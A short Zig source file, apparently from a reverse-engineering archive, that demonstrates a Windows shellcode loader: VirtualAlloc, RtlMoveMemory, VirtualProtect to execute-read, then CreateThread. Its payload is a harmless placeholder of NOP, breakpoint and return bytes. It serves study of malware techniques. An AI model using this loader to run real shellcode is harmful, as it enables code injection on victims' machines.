//     Shellcode Loader
//     Archive of Reversing.ID
// 
//     Abusing windows API to run shellcode as callback.
// 
// Compile:
//     $ zig build 
// 
// Technique:
//     - allocation: VirtualAlloc
//     - writing:    RtlMoveMemory
//     - permission: VirtualProtect
//     - execution:  CreateThread

const std = @import("std");

const BOOL = i32;
const HANDLE = std.os.windows.HANDLE;
const INFINITE = @as(u32, 4294967295);

extern "KERNEL32" fn VirtualAlloc(addr: ?*anyopaque, size: usize, alloctype: u32, prot: u32) ?*anyopaque;
extern "KERNEL32" fn VirtualProtect(addr: ?*anyopaque, size: usize, newprotect: u32, oldprotect: ?*u32) BOOL;
extern "KERNEL32" fn RtlMoveMemory(dst: ?*anyopaque, src: ?*anyopaque, length: usize) void;
extern "KERNEL32" fn CreateThread(attr: ?*anyopaque, stacksize: usize, entrypoint: ?*anyopaque, param: ?*anyopaque, creationflag: u32, threadid: ?*u32) ?HANDLE;
extern "KERNEL32" fn WaitForSingleObject(handle: ?HANDLE, duration: u32) u32;

const MEM_COMMIT  = 0x1000;
const MEM_RESERVE = 0x2000;
const MEM_RELEASE = 0x8000;
const MEM_FREE    = 0x10000;

const PAGE_READONLY           = 0x2;
const PAGE_READWRITE          = 0x4;
const PAGE_EXECUTE            = 0x10;
const PAGE_EXECUTE_READ       = 0x20;
const PAGE_EXECUTE_READWRITE  = 0x40;

pub fn main() !void {
    var oldprotect: u32 = 0;

    // shellcode stored in stack
    var payload = [_] u8 { 0x90, 0x90, 0xCC, 0xC3 };

    // allocate memory buffer for payload as READ-WRITE (no executable)
    var runtime = VirtualAlloc(null, payload.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory(runtime, &payload, payload.len);

    // make buffer executable (R-X)
    _ = VirtualProtect(runtime, payload.len, PAGE_EXECUTE_READ, &oldprotect);

    // execute
    var th_shellcode = CreateThread(null, 0, runtime, null, 0, null);
    _ = WaitForSingleObject(th_shellcode, INFINITE);
}